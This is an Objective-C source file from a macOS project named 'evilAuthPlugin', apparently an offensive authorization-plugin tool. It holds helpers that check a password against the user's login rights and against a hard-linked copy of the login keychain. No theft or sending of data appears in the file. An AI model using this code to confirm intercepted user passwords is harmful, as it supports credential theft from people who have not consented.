//
//  Common.m
//  evilAuthPlugin
//
//  Created by Chris Ross on 9/25/18.
//

#import <Foundation/Foundation.h>
#import "Common.h"


BOOL ValidateLoginPassword(NSString *newPassword) {
    AuthorizationItem right;
    right.name = "system.login.screensaver";
    right.value = NULL;
    right.valueLength = 0;
    right.flags = 0;
    AuthorizationRights authRights;
    authRights.count = 1;
    authRights.items = &right;
    
    AuthorizationItem authEnvItems[2];
    authEnvItems[0].name = kAuthorizationEnvironmentUsername;
    authEnvItems[0].valueLength = NSUserName().length;
    authEnvItems[0].value = (void *)[NSUserName() UTF8String];
    authEnvItems[0].flags = 0;
    authEnvItems[1].name = kAuthorizationEnvironmentPassword;
    authEnvItems[1].valueLength = newPassword.length;
    authEnvItems[1].value = (void *)[newPassword UTF8String];
    authEnvItems[1].flags = 0;
    AuthorizationEnvironment authEnv;
    authEnv.count = 2;
    authEnv.items = authEnvItems;
    
    AuthorizationFlags authFlags = (kAuthorizationFlagExtendRights | kAuthorizationFlagDestroyRights);
    
    // Create an authorization reference, retrieve rights and then release.
    // CopyRights is where the authorization actually takes place and the result lets us know
    // whether auth was successful.
    OSStatus authStatus = AuthorizationCreate(&authRights, &authEnv, authFlags, NULL);
    return (authStatus == errAuthorizationSuccess);
}

BOOL ValidateLoginKeychainPassword(NSString *oldPassword) {
    // Get default keychain path
    SecKeychainRef defaultKeychain = NULL;
    if (SecKeychainCopyDefault(&defaultKeychain) != errSecSuccess) {
        if (defaultKeychain) CFRelease(defaultKeychain);
        return YES;
    }
    UInt32 maxPathLen = MAXPATHLEN;
    char keychainPath[MAXPATHLEN];
    SecKeychainGetPath(defaultKeychain, &maxPathLen, keychainPath);
    CFRelease(defaultKeychain);
    
    // Duplicate the default keychain file to a new location.
    NSString *path = @(keychainPath);
    NSString *newPath = [path stringByAppendingFormat:@".%d",
                         (int)[[NSDate date] timeIntervalSince1970]];
    if (link(path.UTF8String, newPath.UTF8String) != 0) {
        return NO;
    }
    
    // Open and unlock this new keychain file.
    SecKeychainRef keychainRef = NULL;
    SecKeychainOpen(newPath.UTF8String, &keychainRef);
    OSStatus err = SecKeychainUnlock(keychainRef, (UInt32)oldPassword.length,
                                     oldPassword.UTF8String, YES);
    CFRelease(keychainRef);
    
    // Delete the temporary keychain file.
    unlink(newPath.UTF8String);
    
    return (err == errSecSuccess);
}
